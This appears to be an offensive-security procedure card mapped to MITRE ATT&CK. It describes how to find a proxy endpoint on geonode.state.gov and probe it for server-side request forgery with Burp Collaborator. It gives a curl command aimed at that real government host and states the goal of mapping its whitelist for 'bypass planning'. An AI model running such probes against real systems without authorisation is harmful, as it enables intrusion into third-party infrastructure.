---
tags:
  - ssrf
  - recon
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/test-ssrf-with-collaborator]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:55.017Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 2a30ac8f-8c4d-4bfa-b471-cf4ca71dbc64
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-and-Test-SSRF-Endpoint

## Summary

This procedure identifies a potential SSRF-protected proxy endpoint and tests for basic SSRF vulnerabilities using out-of-band detection to confirm server-side request capabilities.

## Description

In web applications, proxy endpoints like /proxy/?url= often implement domain whitelists to prevent SSRF. This procedure involves reconnaissance to locate such endpoints and testing with external collaborators to detect if the backend makes unauthorized requests. The target is geonode.state.gov, where the whitelist restricts to geonode.state.gov domains. Prerequisites include public access to the endpoint and tools like Burp Collaborator for OOB detection.

## Requirements

1. Access to the target web application (e.g., geonode.state.gov)
2. Burp Suite with Collaborator enabled
3. Basic HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation parsing host and path consistently frontend/backend
- Log and monitor outbound requests from servers
- Use network segmentation to isolate internal services

## Objectives

1. Confirm presence of SSRF-protected endpoint
2. Detect basic SSRF via OOB interactions
3. Map whitelist behavior for bypass planning

## Instructions

### Step 1: Locate the Proxy Endpoint

**Context**: Manually explore or use directory fuzzing to find /proxy/?url= and test whitelisted vs. non-whitelisted URLs.

**Command** ([[commands/test-ssrf-with-collaborator]]):
```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://burpcollablink@geonode.state.gov" -H "Host: geonode.state.gov" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> This sends a request with a collaborator URL. Monitor Burp Collaborator for DNS/HTTP pings, confirming SSRF if interactions occur.

### Step 2: Verify Whitelist Enforcement

**Context**: Test direct internal URLs to ensure blocks, setting baseline for bypass.

No specific command; observe responses to non-whitelisted URLs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

- [[commands/test-ssrf-with-collaborator]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- ssrf
- recon
